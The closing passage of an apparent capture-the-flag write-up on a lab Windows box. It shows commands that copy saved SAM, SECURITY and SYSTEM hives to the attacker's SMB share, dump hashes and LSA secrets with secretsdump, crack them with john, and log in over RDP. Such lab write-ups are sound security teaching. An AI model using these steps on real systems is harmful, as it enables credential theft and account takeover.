The command completed successfully.


C:\>copy C:\sam.save \\10.10.47.175\BLUE\sam.save
copy C:\sam.save \\10.10.47.175\BLUE\sam.save
        1 file(s) copied.

C:\>copy C:\security.save \\10.10.47.175\BLUE\security.save
copy C:\security.save \\10.10.47.175\BLUE\security.save
        1 file(s) copied.

C:\>copy C:\system.save \\10.10.47.175\BLUE\system.save
copy C:\system.save \\10.10.47.175\BLUE\system.save
        1 file(s) copied.
```

With these credentials now available locally, I could extract the user hashes using `secretsdump` from impacket and perform the same attack with `john` that I had performed before.

```bash
root@kali:~/ctf/extractor# impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x55bd17830e678f18a3110daf2c17d4c7
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xdc31ac35e19a18b00b5b066de3e8da898bf8da71
dpapi_userkey:0xfaea7403f42b58e1a5dd35ee816185a953b1c795
[*] NL$KM 
 0000   45 94 4A 93 A2 9D D2 8E  2B CF 5F DF 66 75 59 4C   E.J.....+._.fuYL
 0010   E9 BC B8 91 2C 66 59 1E  BF 53 1E 77 BE C2 9B 74   ....,fY..S.w...t
 0020   73 64 04 B4 56 EA 7D 6F  BA C2 1B 7E F0 BA 53 67   sd..V.}o...~..Sg
 0030   E6 E6 66 84 95 1F 90 60  42 EE 34 0A EE 99 9F 55   ..f....`B.4....U
NL$KM:45944a93a29dd28e2bcf5fdf6675594ce9bcb8912c66591ebf531e77bec29b74736404b456ea7d6fbac21b7ef0ba5367e6e66684951f906042ee340aee999f55
[*] Cleaning up...

root@kali:~/ctf/extractor# impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL | egrep 'Administrator|Guest|Jon' > hash.txt
root@kali:~/ctf/extractor# john -format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
                 (Administrator)
alqfna22         (Jon)
2g 0:00:00:00 DONE (2020-11-11 13:43) 2.985g/s 15224Kp/s 15224Kc/s 15231KC/s alr19882006..alpusidi
Warning: passwords printed above might not be all those cracked
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed
```

### Wrapping Up
With the credentials in hand I decided to try my had at a remote desktop session. Which happily gave me access to a desktop.

```bash
root@kali:~# rdesktop -u Jon 10.10.87.38
```

![Jon's PC](/img/blue_boot2root_jon_pc.png)

## Summary
This attack really hammered in how simple metasploit makes some of the more tedious tasks. Not only sourcing and packing an exploit but in things like capturing the outputs of scans, handling setting up listeners to catch shells and the myriad of benefits meterpreter provides in stabalizing a shell, transfering files and pivoting. Despite all that, it was massively educational to be forced to read the exploit I was attempting to understand how to prepare it for use and it was fun attempting to pivot with only the resources I had available in the limited shell. 